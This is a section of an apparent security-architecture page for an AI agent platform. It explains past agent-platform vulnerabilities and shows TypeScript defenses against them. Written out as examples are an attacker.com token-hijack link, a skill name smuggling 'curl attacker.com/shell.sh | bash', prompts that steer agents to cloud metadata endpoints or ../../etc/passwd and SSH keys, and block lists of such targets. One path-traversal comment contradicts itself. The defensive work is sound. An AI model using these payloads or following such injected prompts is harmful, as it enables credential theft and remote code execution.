  <div class="sec" id="security">
    <span class="sec-ey">19 — Security</span>
    <h2>Security Architecture — 8 Layers, Every CVE Fixed</h2>
    <div class="bar"></div>
    <p class="lead">OpenClaw suffered catastrophic security failures in 2026. CVE-2026-25253 (1-click RCE, CVSS 8.8),
      CVE-2026-24763 (command injection), CVE-2026-26322 (SSRF), CVE-2026-26329 (path traversal), and ClawHavoc (341
      malicious skills). Every single one of these attack classes is prevented in Naelao by design — not by patches.
      This section documents every security layer, why it exists, and how to implement it correctly.</p>

    <h3>CVE-2026-25253 — 1-Click RCE via WebSocket Hijacking (CVSS 8.8)</h3>
    <div class="cve">
      <div class="cve-id">CVE-2026-25253 · CVSS 8.8 · Critical · OpenClaw &lt;= 0.9.2</div>
      <div class="cve-title">Root Cause: WebSocket URL Trusts gatewayUrl Query Parameter</div>
      <div class="cve-fix">
        <p>OpenClaw's frontend read a <span class="ic">gatewayUrl</span> parameter from the URL query string and
          automatically connected to it via WebSocket, sending the auth token on connection. An attacker sent a victim a
          link like <span class="ic">https://openclaw.local/?gatewayUrl=https://attacker.com</span>. The victim's
          OpenClaw instance connected to the attacker's server and sent its auth token. Attacker uses the token to
          execute arbitrary shell commands via the WebSocket API.</p>
        <strong>Naelao Prevention:</strong>
        <p>1. The naelao-assistant Worker validates the WebSocket <span class="ic">Origin</span> header against a strict
          allowlist before upgrading. Requests with non-allowlisted origins receive 403 immediately.</p>
        <p>2. No Naelao endpoint ever reads credentials from URL query string parameters. Ever. The linter rule <span
            class="ic">no-query-string-secrets</span> is enforced via ESLint.</p>
        <p>3. CF Access JWT is required before any WebSocket upgrade is accepted — the auth handshake happens via
          headers, not URL.</p>
      </div>
    </div>
    <pre><code><span class="cm">// workers/router/websocket.ts
// WebSocket upgrade handler — this is where CVE-2026-25253 is prevented.</span>

export async function handleWebSocketUpgrade(
  request: Request,
  env: Env
): Promise&lt;Response&gt; {
  
  <span class="cm">// Check 1: Origin validation — MANDATORY. Do not skip even in development.
  // If you skip this in dev and forget to re-enable in prod, you have CVE-2026-25253.</span>
  const origin = request.headers.get('Origin') ?? '';
  const ALLOWED_ORIGINS = [
    'https://app.naelao.dev',
    'https://naelao.dev',
    'https://localhost:3000',    <span class="cm">// dev only — remove before prod</span>
    `https://${env.NAELAO_PAGES_DOMAIN}`,
  ];
  
  if (!ALLOWED_ORIGINS.includes(origin)) {
    console.error(`[NAELAO SECURITY] WebSocket origin rejected: ${origin}`);
    await env.NAELAO_ANALYTICS_QUEUE.send({
      type: 'security_websocket_origin_rejected',
      origin,
      ip: request.headers.get('CF-Connecting-IP'),
      timestamp: Date.now()
    });
    return new Response('Forbidden: invalid origin', { status: 403 });
  }

  <span class="cm">// Check 2: No credentials in URL — fail hard if found
  // This is belt-and-suspenders: the frontend should never send these,
  // but we block it at the server too.</span>
  const url = new URL(request.url);
  const FORBIDDEN_PARAMS = ['token', 'apiKey', 'api_key', 'key', 'secret', 'gatewayUrl', 'gateway_url'];
  for (const param of FORBIDDEN_PARAMS) {
    if (url.searchParams.has(param)) {
      console.error(`[NAELAO SECURITY] Credential in URL rejected: ${param}`);
      return new Response(`Forbidden: ${param} must not appear in URL`, { status: 403 });
    }
  }

  <span class="cm">// Check 3: CF Access JWT validation (for /_assistant and /_admin routes)</span>
  if (url.pathname.startsWith('/_assistant') || url.pathname.startsWith('/_admin')) {
    const jwt = request.headers.get('Cf-Access-Jwt-Assertion');
    if (!jwt) {
      return new Response('Unauthorized: CF Access JWT required', { status: 401 });
    }
    const isValid = await verifyCFAccessJWT(jwt, env);
    if (!isValid) {
      return new Response('Unauthorized: invalid CF Access JWT', { status: 401 });
    }
  }

  <span class="cm">// Check 4: Naelao JWT from Authorization header (not URL)</span>
  const authHeader = request.headers.get('Authorization');
  if (!authHeader?.startsWith('Bearer ')) {
    return new Response('Unauthorized: missing Bearer token', { status: 401 });
  }

  <span class="cm">// All checks passed — proceed with WebSocket upgrade</span>
  const pair = new WebSocketPair();
  const [client, server] = Object.values(pair);
  
  <span class="cm">// Use CF hibernation API — zero cost while WebSocket is idle</span>
  // (Note: actual DO routing happens after upgrade — see naelao-router for routing logic)
  return new Response(null, { status: 101, webSocket: client });
}</code></pre>

    <h3>CVE-2026-24763 — Command Injection via Skill Names</h3>
    <div class="cve">
      <div class="cve-id">CVE-2026-24763 · High · OpenClaw &lt;= 0.8.7</div>
      <div class="cve-title">Root Cause: Skill Names Passed Unsanitized to Shell Commands</div>
      <div class="cve-fix">
        <p>When OpenClaw executed a skill, it constructed shell commands by interpolating the skill name directly into a
          string: <span class="ic">exec(`skill-runner ${skillName} --args ${JSON.stringify(args)}`)</span>. An attacker
          created a skill named <span class="ic">pwn; curl attacker.com/shell.sh | bash</span> and OpenClaw executed the
          injected command.</p>
        <strong>Naelao Prevention:</strong>
        <p>1. Skill names validated by regex <span class="ic">/^[a-z0-9-]+$/</span> before storage and before any use.
          Stored in SpaceDO SQLite with a CHECK constraint.</p>
        <p>2. ALL container exec() calls use argument arrays, never string interpolation. The container sync script uses
          <span class="ic">execFile()</span> not <span class="ic">exec()</span>.</p>
        <p>3. Skill metadata is never embedded in shell commands. Scripts receive args via environment variables set by
          the container bridge, not command-line interpolation.</p>
      </div>
    </div>
    <pre><code><span class="cm">// shared/validation.ts — Skill name validation</span>
const SKILL_NAME_REGEX = /^[a-z0-9-]{1,64}$/;

export function validateSkillName(name: string): void {
  if (!SKILL_NAME_REGEX.test(name)) {
    throw new Error(
      `Invalid skill name: "${name}". Must be lowercase letters, numbers, and hyphens only (max 64 chars).`
    );
  }
}

<span class="cm">// durable-objects/sandbox-do.ts — ALL container commands use argument arrays</span>
async execInContainer(params: {
  command: string;
  args: string[];        <span class="cm">// ALWAYS an array, NEVER a string</span>
  env?: Record&lt;string, string&gt;;
  workingDir?: string;
}): Promise&lt;ExecResult&gt; {
  
  <span class="cm">// NEVER do this:</span>
  <span class="cm">// const cmd = `${params.command} ${params.args.join(' ')}`;  // ❌ injection risk</span>
  <span class="cm">// await execShell(cmd);</span>

  <span class="cm">// ALWAYS do this — argument array prevents shell injection</span>
  const result = await this.containerRef.exec(
    params.command,
    params.args,         <span class="cm">// array — each element is a separate argument</span>
    {
      env: params.env,
      cwd: params.workingDir ?? '/workspace'
    }
  );
  return result;
}</code></pre>

    <h3>CVE-2026-26322 — SSRF via Agent HTTP Requests</h3>
    <div class="cve">
      <div class="cve-id">CVE-2026-26322 · High · OpenClaw &lt;= 0.9.0</div>
      <div class="cve-title">Root Cause: Agent Can Make Outbound Requests to Internal Services</div>
      <div class="cve-fix">
        <p>OpenClaw allowed agents to make arbitrary outbound HTTP requests from inside the container. An attacker
          prompted the agent to fetch <span class="ic">http://169.254.169.254/metadata</span> (AWS IMDS) or <span
            class="ic">http://localhost:8080/admin</span>, extracting cloud credentials or accessing internal services.
        </p>
        <strong>Naelao Prevention:</strong>
        <p>1. Agents NEVER make outbound HTTP requests directly. All HTTP goes through the <span
            class="ic">api-caller</span> skill which runs as a cf-worker script, not inside the container.</p>
        <p>2. The cf-worker script for api-caller validates URLs against an allowlist before making requests. RFC 1918
          addresses (10.x, 172.16.x, 192.168.x), metadata services (169.254.x), and loopback (127.x) are blocked.</p>
        <p>3. CF Container network egress is restricted to only allow outbound to known safe destinations via container
          network policy.</p>
      </div>
    </div>
    <pre><code><span class="cm">// Platform skill: api-caller (cf-worker type)
// This is the ONLY way agents can make outbound HTTP requests.
// Never allow agents to make fetch() calls directly from container code.</span>

const BLOCKED_IP_RANGES = [
  /^10\./,                           <span class="cm">// RFC 1918 private</span>
  /^172\.(1[6-9]|2[0-9]|3[01])\./,  <span class="cm">// RFC 1918 private</span>
  /^192\.168\./,                     <span class="cm">// RFC 1918 private</span>
  /^127\./,                          <span class="cm">// loopback</span>
  /^169\.254\./,                     <span class="cm">// link-local (AWS IMDS, etc.)</span>
  /^0\./,                            <span class="cm">// invalid</span>
  /^::1/,                            <span class="cm">// IPv6 loopback</span>
  /^fc00:/,                          <span class="cm">// IPv6 unique local</span>
];

const BLOCKED_HOSTS = [
  'metadata.google.internal',
  'metadata.aws.com',
  'instance-data.ec2.internal',
];

export async function handleApiCall(params: {
  url: string;
  method: string;
  headers?: Record&lt;string, string&gt;;
  body?: string;
  spaceId: string;
}, env: Env): Promise&lt;APICallResult&gt; {
  
  <span class="cm">// Parse URL and validate</span>
  let parsedUrl: URL;
  try {
    parsedUrl = new URL(params.url);
  } catch {
    return { success: false, error: `Invalid URL: ${params.url}` };
  }

  <span class="cm">// Block non-HTTPS (prevents downgrade attacks)</span>
  if (parsedUrl.protocol !== 'https:') {
    return { success: false, error: 'Only HTTPS URLs are allowed. HTTP is not permitted.' };
  }

  <span class="cm">// Block RFC 1918 and metadata service addresses</span>
  const hostname = parsedUrl.hostname;
  for (const pattern of BLOCKED_IP_RANGES) {
    if (pattern.test(hostname)) {
      return { success: false, error: `Blocked: ${hostname} is a private/reserved IP address.` };
    }
  }
  for (const blockedHost of BLOCKED_HOSTS) {
    if (hostname === blockedHost || hostname.endsWith(`.${blockedHost}`)) {
      return { success: false, error: `Blocked: ${hostname} is a cloud metadata service.` };
    }
  }

  <span class="cm">// Inject credentials from naelao-credentials if configured
  // Never expose raw credentials to the agent — proxy injects them here</span>
  const credentialsResponse = await env.NAELAO_CREDENTIALS.fetch(
    new Request('http://credentials/get-for-url', {
      method: 'POST',
      body: JSON.stringify({ spaceId: params.spaceId, url: params.url })
    })
  );
  const { injectHeaders } = await credentialsResponse.json() as { injectHeaders: Record&lt;string, string&gt; };

  <span class="cm">// Make the actual request</span>
  const response = await fetch(params.url, {
    method: params.method,
    headers: { ...params.headers, ...injectHeaders },
    body: params.body
  });

  return {
    success: true,
    status: response.status,
    body: await response.text(),
    headers: Object.fromEntries(response.headers.entries())
  };
}</code></pre>

    <h3>CVE-2026-26329 — Path Traversal in File Operations</h3>
    <div class="cve">
      <div class="cve-id">CVE-2026-26329 · High · OpenClaw &lt;= 0.8.9</div>
      <div class="cve-title">Root Cause: File Paths Not Normalized Before Use</div>
      <div class="cve-fix">
        <p>OpenClaw's file operations trusted agent-provided paths without normalizing them. An agent prompted to read
          <span class="ic">../../etc/passwd</span> or <span class="ic">../../../root/.ssh/id_rsa</span> could access
          files outside the intended workspace.</p>
        <strong>Naelao Prevention:</strong>
        <p>1. The SpaceR2 helper's <span class="ic">validatePath()</span> blocks any path containing <span
            class="ic">..</span> or starting with <span class="ic">/</span>.</p>
        <p>2. Container operations check that the resolved absolute path starts with <span class="ic">/workspace/</span>
          using <span class="ic">path.resolve()</span>. Any path that resolves outside <span
            class="ic">/workspace/</span> is rejected.</p>
        <p>3. The container's filesystem is mounted read-only everywhere except <span class="ic">/workspace/</span> via
          the container sync script's filesystem restrictions.</p>
      </div>
    </div>
    <pre><code><span class="cm">// durable-objects/sandbox-do.ts — Path validation for container file ops</span>
import { resolve, normalize } from 'path';

const WORKSPACE_ROOT = '/workspace';

function validateContainerPath(agentPath: string): string {
  <span class="cm">// Normalize the path (resolves .., removes duplicate slashes)</span>
  const normalizedPath = normalize(agentPath);
  
  <span class="cm">// Resolve to absolute path from workspace root</span>
  const absolutePath = resolve(WORKSPACE_ROOT, normalizedPath.startsWith('/') 
    ? normalizedPath.slice(1) 
    : normalizedPath
  );
  
  <span class="cm">// CRITICAL CHECK: resolved path must start with /workspace/
  // If it doesn't, the path escaped the workspace via ../ traversal</span>
  if (!absolutePath.startsWith(WORKSPACE_ROOT + '/') &amp;&amp; absolutePath !== WORKSPACE_ROOT) {
    throw new Error(
      `Path traversal blocked: "${agentPath}" resolves to "${absolutePath}" which is outside /workspace`
    );
  }
  
  return absolutePath;
}

<span class="cm">// Example: 
// validateContainerPath('../../etc/passwd') → throws (resolves to /etc/passwd)
// validateContainerPath('../workspace/data') → throws (resolves to /workspace/../workspace/data → /workspace/data is ok but ../workspace is not)
// validateContainerPath('data/file.csv') → returns '/workspace/data/file.csv' ✓
// validateContainerPath('output/../data/file.csv') → returns '/workspace/data/file.csv' ✓ (normalized)</span></code></pre>

    <h3>ClawHavoc — Supply Chain Attack Prevention</h3>
    <div class="cve">
      <div class="cve-id">ClawHavoc · Critical · OpenClaw Skill Marketplace · March 2026</div>
      <div class="cve-title">Root Cause: No Code Review for Community Skills</div>
      <div class="cve-fix">
        <p>341 malicious skills were uploaded to ClawHub by attackers. Skills contained: credential stealers (reading
          OpenClaw's ~/.config files), reverse shells (piping /bin/bash to attacker's server), and keyloggers (capturing
          everything the user typed). OpenClaw installed them without any review because the marketplace had no security
          scanning.</p>
        <strong>Naelao Prevention (4 layers):</strong>
        <p>1. Platform skills (Tier 1): SHA-256 signed by the Naelao team. Signature verified on every load. Cannot be
          replaced or modified by anyone except Naelao platform engineers.</p>
        <p>2. Space skills (Tier 2): Must be approved by Space admin. Not auto-installed. Admin reviews before enabling.
        </p>
        <p>3. Agent/runtime skills (Tier 3): Go through 27-pattern scanner + LLM semantic judge. Rejected if unsafe.
          Quarantined in <span class="ic">spaces/{spaceId}/.skills/.quarantine/</span> for admin review.</p>
        <p>4. Self-authored skills (from assistants): Same 27-pattern scanner + LLM judge + logged to modification_log
          in AssistantDO SQLite. Admin can review and revoke.</p>
